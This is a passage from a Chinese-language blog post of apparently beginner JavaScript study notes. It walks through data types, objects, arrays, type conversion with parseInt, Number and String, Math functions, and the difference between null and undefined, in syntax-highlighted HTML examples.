tex2);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(tex1 + tex2 + num1 + num2+1 );</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//如果有多个数据+，从遇到的第一个不是数值类型的数据，+开始变为连接作用，不表示算数加法，即使后面还有多个num相加</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//js中的浮点数，小数运算</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var num1=0.1;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var num2=0.2;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(num1+num2);//结果会是0.30000000000000004</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var index=Math.pow(10,1);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(parseInt((num1+num2)*index,10)/index);//需要经过此运算转换才可以得到0.3</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//布尔</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//confirm弹窗</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var x=true;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(typeof x);//返回boolean</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//true：1：非0，false：0</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//空 null，项目中释放内存时候会用到</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var a=null;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(typeof a);//返回的object。js的历史遗留问题</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(Object.prototype.toString.call(null));//返回object null，原型的知识点</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//未定义 undefined</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var x=undefined;//声明一个变量但是没有赋值，DOM中常遇到</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(typeof x);//返回undefined</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var x</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(x);</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//复杂数据类型</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//</span></span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day3-对象、数组"><a href="#day3-对象、数组" class="headerlink" title="day3 对象、数组"></a>day3 对象、数组</h2><h3 id="对象、获取对象属性值"><a href="#对象、获取对象属性值" class="headerlink" title="对象、获取对象属性值"></a>对象、获取对象属性值</h3><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h3 id="parseInt，parsefloat强制数据类型转换"><a href="#parseInt，parsefloat强制数据类型转换" class="headerlink" title="parseInt，parsefloat强制数据类型转换"></a>parseInt，parsefloat强制数据类型转换</h3><h3 id="number非强制转换"><a href="#number非强制转换" class="headerlink" title="number非强制转换"></a>number非强制转换</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>js对象数组<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//万物皆对象</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//对象object以键值对出现</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//对象名字&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     属性:值，</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     属性: 值，</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     属性: 值</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//对象就是一系列属性和值的集合，每一对键值对之间用逗号分开</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var obj1=&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     name:&quot;键盘侠&quot;,</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     age:19,</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     hobby:&quot;敲代码&quot;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var obj2=&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     name:&quot;逍遥哥&quot;,</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     age:22,</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     hobby:&quot;二次元&quot;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //获取属性值的方式[],点号</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(obj1[&quot;name&quot;]);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(obj2[&quot;age&quot;]);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(obj1);//输出整个对象</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(obj1.name)</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// var obj3=&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     00:&quot;数学家&quot;,</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &quot;4积分号&quot;:&quot;属性开头是数字&quot;,</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //console.log(obj3.00);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(obj3[00]);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(obj3[&quot;00&quot;]);//notdefind</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //如果当前属性是数字，必须用[],不可用点</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //console.log(obg[])</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(obj3[&quot;4积分号&quot;]);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //冒号前面的就看成是字符串即可，包括引号,当冒号前面是英文时就要加引号，就当语法规定</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//数组</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var array1=[233,233,223,234];//这里与C++很像</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var array2=[233,233,223,234,&quot;string&quot;];//其实什么数据都可以放</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(array1);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(array2);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(array2.length);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //数组的下标从0开始，长度length从1开始</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //通过下标找元素</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(array1[3]);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(array2[4]);</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//数据类型转换：强制类型转换，非强制，对应显式与隐式转换</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//字符串----&gt;数字</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//1、parseInt() 取整数部分，强制类型转换</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt=&quot;123&quot;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var index=parseInt(txt);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(typeof txt);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(typeof index);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(txt);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(index);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(txt+10);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(index+10);</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt1 = &quot;123.456&quot;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(parseInt(txt1));</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt2 = &quot;123文字&quot;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(parseInt(txt2));</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 以上输出都是123</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt1 = &quot;文字&quot;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(parseInt(txt1));//NaN,,parseInt只是把字符串中前面的数字强制转换为对应的数字</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(undefined+10);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// NaN 不是数字，但其本身是数字类型，表示错误运算结果，不等于任何值包括本身</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt3=&quot;+123&quot;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt4=&quot;-123&quot;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(parseInt(txt3));</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(parseInt(txt4));</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(Math.abs(parseInt(txt4)));</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//2、parseFLoat() 强制类型转换，取浮点，与parseInt对应，这个保留小数后面的</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt5=&quot;123.456&quot;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt6=&quot;123.456.123.234&quot;; //123.456</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt7 = &quot;123.456文字.123.234&quot;;//123.456  number</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt8 = &quot;文字123.456.123.234&quot;;//NaN</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(parseFloat(txt8));</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(typeof parseFloat(txt8));</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//Number() 普通转换，非强制转换</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> txt9=<span class="string">&quot;123456&quot;</span><span class="comment">// 123456,1,number</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> txt10=<span class="string">&quot;123文字&quot;</span><span class="comment">//NaN,NaN,number</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">Number</span>(txt10));</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">Number</span>(txt10)-<span class="number">123455</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="built_in">Number</span>(txt10));</span></span><br><span class="line"><span class="javascript">        <span class="comment">// parseInt()和Number()区别，都可以进行字符串到数字类型之间的转换，当转换的内容</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 包含非数字的时候，Number()就会返回NAN, parseInt()看情况， 如果是数字开头，就</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 返回合法的数字部分，如果是文字开头，返回NAN</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//数字----&gt;字符串</span></span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day4-类型转换"><a href="#day4-类型转换" class="headerlink" title="day4 类型转换"></a>day4 类型转换</h2><h3 id="toString-String-isNaN"><a href="#toString-String-isNaN" class="headerlink" title="toString,String,isNaN"></a>toString,String,isNaN</h3><h3 id="Boolean，运算符隐式转换"><a href="#Boolean，运算符隐式转换" class="headerlink" title="Boolean，运算符隐式转换"></a>Boolean，运算符隐式转换</h3><h3 id="Math系列"><a href="#Math系列" class="headerlink" title="Math系列"></a>Math系列</h3><h3 id="null和undefined区别"><a href="#null和undefined区别" class="headerlink" title="null和undefined区别"></a>null和undefined区别</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>js数据类型转换<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//复习：复杂数据类型，对象（一系列属性和值的集合，可以对比css来记忆），数组</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> xyobj = &#123;</span></span><br><span class="line"><span class="javascript">            name:<span class="string">&quot;逍遥哥&quot;</span>,</span></span><br><span class="line">            age:20,</span><br><span class="line"><span class="javascript">            hobby:<span class="string">&quot;ACG&quot;</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="javascript">        <span class="comment">//找到对象中的值[] .</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(xyobj.name);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(xyobj[<span class="string">&quot;age&quot;</span>]);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//数组，一系类数据的集合，不限数据类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> arr=[<span class="string">&quot;ACG&quot;</span>,<span class="string">&quot;二次元&quot;</span>,<span class="string">&quot;xioayao&quot;</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(arr.length);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(arr[<span class="number">0</span>]);</span></span><br><span class="line"><span class="javascript"><span class="comment">//--------------------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//字符串-&gt;数字，转换parseInt,parseFloat,Number,文字开头会出现NaN,NaN是错误运算结果，本身是数字类型</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//isNAN()判断一个运算结果是不是一个NaN</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> num=<span class="string">&quot;12&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">isNaN</span>(num));<span class="comment">//false</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//toString()强制类型转换，数字转换为字符串</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> num=<span class="number">123</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> num);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> (num.toString()));</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//String()强制</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> txt=<span class="number">123</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index0=<span class="built_in">String</span>(txt);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> index0);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//toString与String区别，toString不可以转换undefined和null,String 可以,String比toString好用点，两者typeof都是string</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index = <span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index2 = <span class="literal">undefined</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(toString(index2));</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">String</span>(index2));</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> toString(index2));</span></span><br><span class="line"><span class="javascript"><span class="comment">//-------------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//Boolean()j转成布尔值</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="number">0</span>));<span class="comment">//false</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="number">3</span>));<span class="comment">//true</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="string">&quot;2&quot;</span>));<span class="comment">//true</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="string">&quot;&quot;</span>));<span class="comment">//false</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//js数据类型不严格，通过其他操作也可以进行数据类型之间的转换,比如运算符</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//数字-&gt;字符串类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x=<span class="string">&quot;123&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> y=<span class="number">121</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> (x+y));</span></span><br><span class="line"><span class="javascript">        <span class="comment">//- * / %取余 字符串-&gt;数字</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> (x-y));</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> (x*y));</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> (x/y));</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(x%y);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//检测一个值是奇数偶数 3%2=1</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="number">3</span>%<span class="number">2</span>);</span></span><br><span class="line"><span class="javascript"><span class="comment">//------------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//数值操作</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//Math.abs()绝对值  </span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//Math.ceil() Math.floor()向上向下取整，向下取整和parseInt相似 </span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//Math.max() Math.min()返回括号中的最大值或者最小值</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//Math.random()返回0-1之间的小数，开区间</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> arr2=[<span class="number">555</span>,<span class="number">666</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index= <span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random()* arr2.length);<span class="comment">//如果这里random后面忘加括号，会导致console输出时报错undefined</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(arr2[index]);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(arr2[<span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random() * arr2.length)]);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//随机抽奖</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nam=[<span class="string">&quot;逍遥&quot;</span>,<span class="string">&quot;红毛&quot;</span>,<span class="string">&quot;小马&quot;</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> area=[<span class="string">&quot;北极&quot;</span>,<span class="string">&quot;火星&quot;</span>,<span class="string">&quot;镜面世界&quot;</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> goods=[<span class="string">&quot;现金红包&quot;</span>,<span class="string">&quot;作业大礼包&quot;</span>,<span class="string">&quot;女朋友&quot;</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index1=<span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random()*nam.length);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index2=<span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random()*area.length);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index3=<span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random()*goods.length);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//玄学，这里当nam变量变成name时，name.length就会变成8，似乎是个bug</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(nam.length)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(index1);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(nam[index1]);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;恭喜&quot;</span>+nam[index1]+<span class="string">&quot;获得了&quot;</span>+area[index2]+<span class="string">&quot;的&quot;</span>+goods[index3]+<span class="string">&quot;一个&quot;</span>);</span></span><br><span class="line"><span class="javascript"><span class="comment">//-----------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//面试题：null和undefined的区别</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//null表示空，是关键字，undefined表示未定义，不是关键字</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//undefined转换的值是NAN，null为0</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="literal">undefined</span>*<span class="number">10</span>)<span class="comment">//NaN</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="literal">null</span>*<span class="number">10</span>)<span class="comment">//0</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//比较运算符 =赋值  ==比较两个值是否相等    ===比较两个值是否相等（值的类型）</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="literal">null</span>==<span class="literal">undefined</span>);<span class="comment">//true,两个都表示没有</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="literal">null</span>===<span class="literal">undefined</span>);<span class="comment">//false,说明两者类型不一样</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//应用</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//null当使用一个比较大的对象，需要对其进行释放内容，这时需要设置为null</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="number">111</span>==<span class="string">&quot;111&quot;</span>);<span class="comment">//true,只会考虑数值是否相同</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="number">111</span>===<span class="string">&quot;111&quot;</span>);<span class="comment">//false，两个数据类型不同，一个数值一个字符串</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 